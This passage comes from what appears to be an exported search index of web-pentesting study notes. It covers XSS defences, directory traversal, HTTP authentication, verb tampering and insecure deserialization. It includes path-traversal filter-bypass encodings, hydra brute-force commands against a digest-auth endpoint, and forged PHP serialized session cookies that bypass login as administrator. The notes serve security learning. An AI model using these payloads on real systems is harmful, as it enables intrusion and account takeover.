for a PHP back-end, we can use the\u00a0<code>addslashes</code>\u00a0function to sanitize user input by escaping special characters with a backslash:</p> <pre><code>addslashes($_GET['email'])\n</code></pre> <p>For a NodeJS back-end, we can also use the\u00a0DOMPurify\u00a0library as we did with the front-end, as follows:</p> <pre><code>import DOMPurify from 'dompurify';\nvar clean = DOMPurify.sanitize(dirty);\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#3-never-use-input-directly-within-certain-html-tags","title":"3. Never use input directly within certain HTML tags","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#frontend-side-protection_2","title":"Frontend-side protection","text":"<p>Never use user input directly within certain HTML tags. If user input goes into any of the following examples, it can inject malicious JavaScript code:</p> <ol> <li>JavaScript code\u00a0<code>&lt;script&gt;&lt;/script&gt;</code></li> <li>CSS Style Code\u00a0<code>&lt;style&gt;&lt;/style&gt;</code></li> <li>Tag/Attribute Fields\u00a0<code>&lt;div name='INPUT'&gt;&lt;/div&gt;</code></li> <li>HTML Comments\u00a0<code>&lt;!-- --&gt;</code></li> </ol> <p>Avoid using JavaScript functions that allow changing raw text of HTML fields, like:</p> <ul> <li><code>DOM.innerHTML</code></li> <li><code>DOM.outerHTML</code></li> <li><code>document.write()</code></li> <li><code>document.writeln()</code></li> <li><code>document.domain</code></li> </ul> <p>Avoid the following jQuery functions:</p> <ul> <li><code>html()</code></li> <li><code>parseHTML()</code></li> <li><code>add()</code></li> <li><code>append()</code></li> <li><code>prepend()</code></li> <li><code>after()</code></li> <li><code>insertAfter()</code></li> <li><code>before()</code></li> <li><code>insertBefore()</code></li> <li><code>replaceAll()</code></li> <li><code>replaceWith()</code></li> </ul> <p>As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#backend-side-protection-or-output-html-encoding","title":"Backend-side protection or Output HTML Encoding","text":"<p>Another important aspect to pay attention to in the back-end is\u00a0<code>Output Encoding</code>. This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability.</p> <p>For a PHP back-end, we can use the\u00a0<code>htmlspecialchars</code>\u00a0or the\u00a0<code>htmlentities</code>\u00a0functions, which would encode certain special characters into their HTML codes (e.g.\u00a0<code>&lt;</code>\u00a0into\u00a0<code>&amp;lt</code>):</p> <pre><code>htmlentities($_GET['email']);\n</code></pre> <p>For a NodeJS back-end, we can use any library that does HTML encoding, like\u00a0<code>html-entities</code>, as follows:</p> <pre><code>import encode from 'html-entities';\nencode('&lt;'); // -&gt; '&amp;lt;'\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#server-configurations","title":"Server configurations","text":"<ul> <li>Using HTTPS across the entire domain.</li> <li>Using XSS prevention headers.</li> <li>Using the appropriate Content-Type for the page, like\u00a0<code>X-Content-Type-Options=nosniff</code>.</li> <li>Using\u00a0<code>Content-Security-Policy</code>\u00a0options, like\u00a0<code>script-src 'self'</code>, which only allows locally hosted scripts.</li> <li>Using the\u00a0<code>HttpOnly</code>\u00a0and\u00a0<code>Secure</code>\u00a0cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.</li> </ul>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#httponly","title":"HTTPOnly","text":"<p>The  HTTPOnly flag can be enabled with the response header <code>Set-Cookie</code>:</p> <pre><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly\n</code></pre> <p>HTTPOnly forbids javaScript from accessing the cookies, for example, through the\u00a0<code>Document.cookie</code>\u00a0property. Note that a cookie that has been created with\u00a0<code>HttpOnly</code>\u00a0directive will still be sent with JavaScript-initiated requests, for example, when calling\u00a0<code>XMLHttpRequest.send()</code>\u00a0or\u00a0<code>fetch()</code>. This mitigates attacks against cross-site scripting XSS.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#having-a-waf","title":"Having a WAF...","text":"<p>... well configured</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>XSSER: An automated web pentesting framework tool to detect and exploit XSS vulnerabilities</li> <li>XSS Strike </li> <li>Brute XSS</li> <li>Vectors (payload) regularly updated: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet.</li> <li> <p>Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html.</p> </li> <li> <p>Payloads:\u00a0</p> <ul> <li>PayloadAllTheThings </li> <li>PayloadBox</li> </ul> </li> </ul>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/directory-traversal/","title":"Directory Traversal attack","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.1. Testing Directory Traversal File Include</p> ID Link to Hackinglife Link to OWASP Description 5.1 WSTG-ATHZ-01 Testing Directory Traversal File Include - Identify injection points that pertain to path traversal.  - Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion) Resources <ul> <li>PayAllTheThings</li> </ul> <p>Directory traversal vulnerabilities, also known as path traversal or directory climbing vulnerabilities, are a type of security vulnerability that occurs when a web application allows unauthorized access to files and directories outside the intended or authorized directory structure. Directory traversal vulnerabilities can lead to serious data breaches and system compromises if not addressed/mitigated.</p> <p>Directory traversal vulnerabilities typically arise from improper handling of user input, especially when dealing with file or directory paths. This input could be obtained from URL parameters, user-generated content, or other sources. An attacker takes  advantage of lax input validation or insufficient sanitization of user inputs. They manipulate the input by adding special characters or sequences that trick the application into navigating to directories it shouldn't have access to.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/directory-traversal/#before-testing","title":"Before testing","text":"<p>Each operating system uses different characters as path separator:</p> <p>Unix-like OS:</p> <pre><code>root directory: \"/\"\ndirectory separator: \"/\"\n</code></pre> <p>Windows OS' Shell':</p> <pre><code>root directory: \"&lt;drive letter&gt;:\\\"\ndirectory separator: \"\\\" or \"/\"\n</code></pre> <p>Classic Mac OS:</p> <pre><code>root directory: \"&lt;drive letter&gt;:\"\ndirectory separator: \":\"\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/directory-traversal/#basic-exploitation","title":"Basic exploitation","text":"<p>We can use the\u00a0<code>..</code>\u00a0characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.</p> <pre><code>../\n..\\\n..\\/\n\n\n#####\n# - URL encoding and double URL encoding\n#####\n\n# ../\n%2e%2e%2f\n%2e%2e/\n..%2f\n\n# ..\\\n%2e%2e%5c\n%2e%2e\\\n..%5c\n%252e%252e%255c\n\n... \n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%uff0e%uff0e%u2215\n%uff0e%uff0e%u2216\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/directory-traversal/#interesting-files","title":"Interesting files","text":"<p>Interesting Windows files Interesting Linux files</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/directory-traversal/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> <li>DotDotPwn - The Directory Traversal Fuzzer -\u00a0http://dotdotpwn.sectester.net</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/http-authentication-schemes/","title":"HTTP Authentication Schemes","text":"<p>This resource is pretty awesome: https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication.</p> <p>I'll be (CTRL-c-CTRL-v)ing what I think it's important.</p>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#understanding-http-authentication","title":"Understanding HTTP Authentication","text":"<p>Authentication is the process of identifying whether a client is eligible to access a resource. The HTTP protocol supports authentication as a means of negotiating access to a secure resource.</p> <p>The initial request from a client is typically an anonymous request, not containing any authentication information. HTTP server applications can deny the anonymous request while indicating that authentication is required. The server application sends WWW-Authentication headers to indicate the supported authentication schemes. </p>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#http-authentication-schemes_1","title":"HTTP Authentication Schemes","text":"Authentication Scheme Description Anonymous An anonymous request does not contain any authentication information. This is equivalent to granting everyone access to the resource. Basic Basic authentication sends a Base64-encoded string that contains a user name and password for the client. Base64 is not a form of encryption and should be considered the same as sending the user name and password in clear text. If a resource needs to be protected, strongly consider using an authentication scheme other than basic authentication. Digest Digest authentication is a challenge-response scheme that is intended to replace Basic authentication. The server sends a string of random data called a nonce to the client as a challenge. The client responds with a hash that includes the user name, password, and nonce, among additional information. The complexity this exchange introduces and the data hashing make it more difficult to steal and reuse the user's credentials with this authentication scheme. Digest authentication requires the use of Windows domain accounts. The digest realm is the Windows domain name. Therefore, you cannot use a server running on an operating system that does not support Windows domains, such as Windows XP Home Edition, with Digest authentication. Conversely, when the client runs on an operating system that does not support Windows domains, a domain account must be explicitly specified during the authentication. NTLM NT LAN Manager (NTLM) authentication is a challenge-response scheme that is a securer variation of Digest authentication. NTLM uses Windows credentials to transform the challenge data instead of the unencoded user name and password. NTLM authentication requires multiple exchanges between the client and server. The server and any intervening proxies must support persistent connections to successfully complete the authentication. Negotiate Negotiate authentication automatically selects between the Kerberos protocol and NTLM authentication, depending on availability. The Kerberos protocol is used if it is available; otherwise, NTLM is tried. Kerberos authentication significantly improves upon NTLM. Kerberos authentication is both faster than NTLM and allows the use of mutual authentication and delegation of credentials to remote machines. Windows Live ID The underlying Windows HTTP service includes authentication using federated protocols. However, the standard HTTP transports in WCF do not support the use of federated authentication schemes, such as Microsoft Windows Live ID. Support for this feature is currently available through the use of message security.","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#basic-http-authentication","title":"Basic HTTP Authentication","text":"<p>Basic HTTP authentication is a simple authentication mechanism used in web applications and services to restrict access to certain resources or functionalities. Basic authentication sends a Base64-encoded string that contains a user name and password for the client. Base64 is not a form of encryption and should be considered the same as sending the user name and password in clear text. If a resource needs to be protected, strongly consider using an authentication scheme other than basic authentication.</p> <p></p> <ul> <li>Client Request: When a client (usually a web browser) makes a request to a protected resource on a server, the server responds with a 401 Unauthorized status code if the resource requires authentication.</li> <li>Challenge Header: In the response, the server includes a WWW-Authenticate header with the value \"Basic.\" This header tells the client that it needs to provide credentials to access the resource.</li> <li> <p>Credential Format: The client constructs a string in the format username:password and encodes it in Base64. It then includes this encoded string in an Authorization header in subsequent requests. The header looks like this:</p> <ul> <li>Authorization: Basic  <li> <p>Server Validation: When the server receives the request with the Authorization header, it decodes the Base64-encoded credentials, checks them against its database of authorized users, and grants access if the credentials are valid.</p> </li> <li>Access Granted or Denied: If the credentials are valid, the server allows access to the requested resource by responding with the resource content and a 200 OK status code. If the credentials are invalid or missing, it continues to respond with 401 Unauthorized.</li>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#how-to-attack-it","title":"How to attack it","text":"<p>You can perform dictionary attacks with Burpsuite, by encoding the payload with base64. You can also use hydra.</p>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#digest-http-authentication","title":"Digest HTTP Authentication","text":"<p>HTTP Digest Authentication is an authentication mechanism used in web applications and services to securely verify the identity of users or clients trying to access protected resources. It addresses some of the security limitations of Basic Authentication by employing a challenge-response mechanism and hashing to protect user credentials during transmission. However, like Basic Authentication, it's important to use HTTPS to ensure the security of the communication.</p> <p></p> <ul> <li>Client Request: When a client (usually a web browser) makes a request to a protected resource on a server, the server responds with a 401 Unauthorized status code if authentication is required.</li> <li>Challenge Header: In the response, the server includes a WWW-Authenticate header with the value \"Digest.\" This header provides information needed by the client to construct a secure authentication request. Example of a WWW-Authenticate header:</li> </ul> <pre><code>WWW-Authenticate: Digest realm=\"Example\", qop=\"auth\", nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"\n\n# Where:\n# - **realm**: A descriptive string indicating the protection space (usually the name of the application or service).\n# - **qop (Quality of Protection)**: Specifies the quality of protection. Commonly set to \"auth.\"\n# - **nonce**: A unique string generated by the server for each request to prevent replay attacks.\n# - **opaque**: An opaque value set by the server, which the client must return unchanged in the response.\n</code></pre> <ul> <li>Client Response: The client constructs a response using the following components: Username, Realm, Password, Nonce, Request URI (the path to the protected resource), HTTP method (e.g., GET, POST), cnonce (a client-generated nonce), qop (the quality of protection), H(A1) and H(A2), which are hashed values derived from the components. It then calculates a response hash (response) based on these components and includes it in an Authorization header. Example Authorization header:</li> </ul> <pre><code>Authorization: Digest username=\"user\", realm=\"Example\", nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\", uri=\"/resource\", qop=auth, nc=00000001, cnonce=\"0a4f113b\", response=\"6629fae49393a05397450978507c4ef1\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"\n</code></pre> <ul> <li>Server Validation: The server receives the request with the Authorization header and validates the response hash calculated by the client. It does this by reconstructing the same components and calculating its own response hash. If the hashes match, the server considers the client authenticated and grants access to the requested resource.</li> </ul>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#how-to-attack-it_1","title":"How to attack it","text":"<p>We can use hydra.</p> <pre><code>hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt http-get://192.155.195.3/digest/\n\nhydra 192.155.195.3 -l admin -P /root/Desktop/wordlists/100-common-passwords.txt http-get /digest/\n</code></pre>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#multifactor-authentication","title":"Multifactor Authentication","text":"","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#otp","title":"OTP","text":"<p>OTP (One-Time Password) security is a two-factor authentication (2FA) method used to enhance the security of user accounts and systems. OTPs are temporary, single-use codes that are typically generated and sent to the user's registered device (such as a mobile phone) to verify their identity during login or transaction processes. The primary advantage of OTPs is that they are time-sensitive and expire quickly, making them difficult for attackers to reuse.</p> <p>For bruteforcing OTPs OWASZAP is more recommended since it does not introduce delays or throttling.</p>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-authentication-schemes/#types-of-otps","title":"Types of OTPs","text":"<ul> <li>Time-Based OTPs (TOTP): TOTP is a widely used OTP method that generates codes based on a shared secret key and the current time. These codes are typically valid for a short duration, often 30 seconds.</li> <li>SMS-Based OTPs: OTPs can be sent to users via SMS messages. When users log in, they receive an OTP on their mobile phone, which they must enter to verify their identity.</li> <li>Rate Limiting and Lockout: Implement rate limiting and account lockout mechanisms to prevent brute force attacks on OTPs. Lockout accounts after a certain number of failed OTP attempts. OTP rate limiting is a security mechanism used to prevent brute force attacks or abuse of one-time password (OTP) systems, such as those used in two-factor authentication (2FA). Rate limiting restricts the number of OTP verification attempts that can be made within a specified time period. By enforcing rate limits, organizations can reduce the risk of attackers guessing or trying out multiple OTPs in quick succession.</li> </ul>","tags":["authentication","windows","basic digest","NTLM"]},{"location":"webexploitation/http-verb-tampering/","title":"HTTP Verb Tampering","text":"<p>OWASP</p> <p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.6. Test HTTP Methods</p> ID Link to Hackinglife Link to OWASP Description 2.6 WSTG-CONF-06 Test HTTP Methods - Enumerate supported HTTP methods using OPTIONS. - Test for access control bypass (GET-&gt;HEAD-&gt;FOO). - Test HTTP method overriding techniques.","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/insecure-deserialization/","title":"Insecure deserialization","text":"<p>Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.</p> Sources for these notes <ul> <li>Portswigger: Insecure deserialization.</li> <li>Hacktricks: Deserialization.</li> <li>OWASP deserialization Cheat sheet.</li> </ul> Tools <ul> <li>Java: ysoserial</li> <li>PHP: phpggc.</li> <li>Burpsuite Extensions: Java Deserialization Scanner, PHP Object Injection Slinger, PHP Object Injection Check</li> <li>Exploits: Ruby 2.X generic deserialization to RCE gadget chain</li> </ul>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#what-is-deserialization","title":"What is deserialization","text":"<ul> <li> <p>Serialization\u00a0is the process of converting complex data structures, such as objects and their fields, into a \"flatter\" format that can be sent and received as a sequential stream of bytes.</p> </li> <li> <p>Deserialization\u00a0is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.</p> </li> </ul> <p>Exactly how objects are serialized depends on the language. Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability. \u00a0</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#identifying","title":"Identifying","text":"","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#php","title":"PHP","text":"<p>PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. </p> <p>For example, consider a\u00a0<code>User</code>\u00a0object with the attributes:</p> <p><code>$user-&gt;name = \"carlos\"; $user-&gt;isLoggedIn = true;</code></p> <p>When serialized, this object may look something like this:</p> <p><code>O:4:\"User\":2:{s:4:\"name\":s:6:\"carlos\"; s:10:\"isLoggedIn\":b:1;}</code></p> <pre><code>- `O:4:\"User\"`\u00a0- An object with the 4-character class name\u00a0`\"User\"`\n- `2`\u00a0- the object has 2 attributes\n- `s:4:\"name\"`\u00a0- The key of the first attribute is the 4-character string\u00a0`\"name\"`\n- `s:6:\"carlos\"`\u00a0- The value of the first attribute is the 6-character string\u00a0`\"carlos\"`\n- `s:10:\"isLoggedIn\"`\u00a0- The key of the second attribute is the 10-character string\u00a0`\"isLoggedIn\"`\n- `b:1`\u00a0- The value of the second attribute is the boolean value\u00a0`true`\n</code></pre> <p>The native methods for PHP serialization are\u00a0<code>serialize()</code>\u00a0and\u00a0<code>unserialize()</code>. If you have source code access, you should start by looking for\u00a0<code>unserialize()</code>\u00a0anywhere in the code and investigating further.</p> <p>In PHP, specific magic methods are utilized during the serialization and deserialization processes:</p> <ul> <li> <p><code>__sleep</code>: Invoked when an object is being serialized. This method should return an array of the names of all properties of the object that should be serialized. It's commonly used to commit pending data or perform similar cleanup tasks.</p> </li> <li> <p><code>__wakeup</code>: Called when an object is being deserialized. It's used to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks.</p> </li> <li> <p><code>__unserialize</code>: This method is called instead of <code>__wakeup</code> (if it exists) when an object is being deserialized. It gives more control over the deserialization process compared to <code>__wakeup</code>.</p> </li> <li> <p><code>__destruct</code>: This method is called when an object is about to be destroyed or when the script ends. It's typically used for cleanup tasks, like closing file handles or database connections.</p> </li> <li> <p><code>__toString</code>: This method allows an object to be treated as a string. It can be used for reading a file or other tasks based on the function calls within it, effectively providing a textual representation of the object.</p> </li> </ul>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#java","title":"Java","text":"<p>Some languages, such as Java, use binary serialization formats.</p> <p>To distinguish it: serialized Java objects always begin with the same bytes, which are encoded as\u00a0<code>ac ed</code>\u00a0in hexadecimal and\u00a0<code>rO0</code>\u00a0in Base64.</p> <p>Any class that implements the interface\u00a0<code>java.io.Serializable</code>\u00a0can be serialized and deserialized.</p> <p>If you have source code access, take note of any code that uses the\u00a0<code>readObject()</code>\u00a0method, which is used to read and deserialize data from an\u00a0<code>InputStream</code>.</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#attacks","title":"Attacks","text":"","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#1-manipulate-serialized-objects","title":"1. Manipulate serialized objects","text":"<p>If you have source code access, take note of any code that uses the\u00a0<code>readObject()</code>\u00a0method, which is used to read and deserialize data from an\u00a0<code>InputStream</code>.</p> <p>As a simple example, consider a website that uses a serialized\u00a0<code>User</code>\u00a0object to store data about a user's session in a cookie. If an attacker spotted this serialized object in an HTTP request, they might decode it to find the following byte stream:</p> <p><code>O:4:\"User\":2:{s:8:\"username\";s:6:\"carlos\";s:7:\"isAdmin\";b:0;}</code></p> <p>The\u00a0<code>isAdmin</code>\u00a0attribute is an obvious point of interest. An attacker could simply change the boolean value of the attribute to\u00a0<code>1</code>\u00a0(true), re-encode the object, and overwrite their current cookie with this modified value. In isolation, this has no effect. However, let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:</p> <pre><code>$user = unserialize($_COOKIE); \nif ($user-&gt;isAdmin === true)\n{ // allow access to admin interface }\n</code></pre> <p>This vulnerable code would instantiate a\u00a0<code>User</code>\u00a0object based on the data from the cookie, including the attacker-modified\u00a0<code>isAdmin</code>\u00a0attribute. At no point is the authenticity of the serialized object checked. This data is then passed into the conditional statement and, in this case, would allow for an easy privilege escalation.</p> Burpsuite lab <p>Burpsuite Lab: Modifying serialized objects</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#2-modify-data-types","title":"2. Modify data types","text":"<p>PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (<code>==</code>) when comparing different data types.</p> <p>Reference:  PHP type juggling</p> <p>Additionally, if we spot a session cookie base64-encoded with an object, such as this PHP one, we can try to modify it. </p> <pre><code>Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJieno5ZmJ2OHV6YXM3MTRlcnJuaGExcTVwcGJ6eWY1aCI7fQ%3d%3d\n</code></pre> <p>Decoded from base64</p> <pre><code>O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"bzz9fbv8uzas714errnha1q5ppbzyf5h\";}\n</code></pre> <p><code>s</code> refers to string, and <code>i</code> to integer. We could modify the input and the data type modifying the object to: </p> <pre><code>O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0:\"\";}\n</code></pre> <p>Afterwards, base64 encode the object to insert it as the cookie session:</p> <pre><code>Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDoiIjt9\n</code></pre> <p>Explanation:  Let's say an attacker modified the password attribute so that it contained the integer\u00a0<code>0</code>\u00a0instead of the expected string. As long as the stored password does not start with a number, the condition would always return\u00a0<code>true</code>, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the\u00a0<code>0</code>\u00a0would be converted to a string and the condition would evaluate to\u00a0<code>false</code>.</p> Burpsuite lab <p>Burpsuite Lab: Modifying serialized data types</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#3-abuse-application-functionality","title":"3. Abuse application functionality","text":"<p>A website's functionality might also perform dangerous operations on data from a deserialized object. In this case, you can use insecure deserialization to pass in unexpected data and leverage the related functionality to do damage.</p> <p>For example, as part of a website's \"Delete user\" functionality, the user's profile picture is deleted by accessing the file path in the\u00a0<code>$user-&gt;image_location</code>\u00a0attribute. If this\u00a0<code>$user</code>\u00a0was created from a serialized object, an attacker could exploit this by passing in a modified object with the\u00a0<code>image_location</code>\u00a0set to an arbitrary file path.</p> Burpsuite lab <p>Burpsuite Lab: Using application functionality to exploit insecure deserialization</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#4-magic-methods","title":"4. Magic methods","text":"<p>Magic methods are a special subset of methods that are invoked automatically whenever a particular event or scenario occurs. \u00a0One of the most common examples in PHP is\u00a0<code>__construct()</code>, which is invoked whenever an object of the class is instantiated, similar to Python's\u00a0<code>__init__</code>. Typically, constructor magic methods like this contain code to initialize the attributes of the instance. However, magic methods can be customized by developers to execute any code they want.</p> <p>PHP -&gt; Most importantly in this context, some languages have magic methods that are invoked automatically\u00a0during\u00a0the deserialization process. For example, PHP's\u00a0<code>unserialize()</code>\u00a0method looks for and invokes an object's\u00a0<code>__wakeup()</code>\u00a0magic method.</p> <p>JAVA -&gt; In Java deserialization, the same applies to the\u00a0<code>ObjectInputStream.readObject()</code>\u00a0method, which is used to read data from the initial byte stream and essentially acts like a constructor for \"re-initializing\" a serialized object. However,\u00a0<code>Serializable</code>\u00a0classes can also declare their own\u00a0<code>readObject()</code>\u00a0method as follows:</p> <pre><code>private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException \n{ \n    // implementation \n}\n</code></pre> <p>A\u00a0<code>readObject()</code>\u00a0method declared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more closely.</p> <p>You should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits.</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#5-inject-arbitrary-objects","title":"5. Inject arbitrary objects","text":"<p>The methods available to an object are determined by its class. Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized.</p> <p>The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.</p> Burpsuite lab <p>Burpsuite Lab: Arbitrary object injection in PHP</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#6-gadget-chains","title":"6. Gadget chains","text":"<p>Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a \"gadget chain\".</p> <p>A \"gadget\" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous \"sink gadget\", where it can cause maximum damage.</p> <p>It is important to note that the vulnerability is the deserialization of user-controllable data, not the mere presence of a gadget chain in the website's code or any of its libraries.</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#prebuilt-gadget-chains","title":"Prebuilt gadget chains","text":"<p>Java: ysoserial</p> <p>PHP: phpggc </p> <p>About ysoserial: Not all of the gadget chains in ysoserial enable you to run arbitrary code. Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server:   - The\u00a0<code>URLDNS</code>\u00a0chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.   - <code>JRMPClient</code>\u00a0is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.</p> Burpsuite lab <p>Burpsuite Lab: Exploiting Java deserialization with Apache Commons</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#documented-gadget-chains","title":"Documented gadget chains","text":"<p>There may not always be a dedicated tool available for exploiting known gadget chains in the framework used by the target application. In this case, it's always worth looking online to see if there are any documented exploits that you can adapt manually.</p> Burpsuite lab <p>Burpsuite Lab: Exploiting Ruby deserialization using a documented gadget chain</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#7-your-own-exploit","title":"7. Your own exploit","text":"","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#8-phar-deserialization","title":"8. PHAR deserialization","text":"<p>PHP provides several URL-style wrappers that you can use for handling different protocols when accessing file paths. One of these is the\u00a0<code>phar://</code>\u00a0wrapper, which provides a stream interface for accessing PHP Archive (<code>.phar</code>) files.</p> <p>The PHP documentation reveals that\u00a0<code>PHAR</code>\u00a0manifest files contain serialized metadata. Crucially, if you perform any filesystem operations on a\u00a0<code>phar://</code>\u00a0stream, this metadata is implicitly deserialized.</p> <p>This means that a\u00a0<code>phar://</code>\u00a0stream can potentially be a vector for exploiting insecure deserialization.</p> <p>The explanation: This technique requires you to upload the\u00a0<code>PHAR</code>\u00a0to the server somehow. One approach is to use an image upload functionality, for example. If you are able to create a polyglot file, with a\u00a0<code>PHAR</code>\u00a0masquerading as a simple\u00a0<code>JPG</code>, you can sometimes bypass the website's validation checks. If you can then force the website to load this polyglot \"<code>JPG</code>\" from a\u00a0<code>phar://</code>\u00a0stream, any harmful data you inject via the\u00a0<code>PHAR</code>\u00a0metadata will be deserialized. As the file extension is not checked when PHP reads a stream, it does not matter that the file uses an image extension. As long as the class of the object is supported by the website, both the\u00a0<code>__wakeup()</code>\u00a0and\u00a0<code>__destruct()</code>\u00a0magic methods can be invoked in this way, allowing you to potentially kick off a gadget chain using this technique.</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#9-memory-corruption","title":"9. Memory corruption","text":"<p>Even without the use of gadget chains, it is still possible to exploit insecure deserialization. If all else fails, there are often publicly documented memory corruption vulnerabilities that can be exploited via insecure deserialization. TDeserialization methods, such as PHP's\u00a0<code>unserialize()</code>\u00a0are rarely hardened against these kinds of attacks, and expose a huge amount of attack surface.</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/jwt-attacks/","title":"Json Web Token attacks","text":"Resources 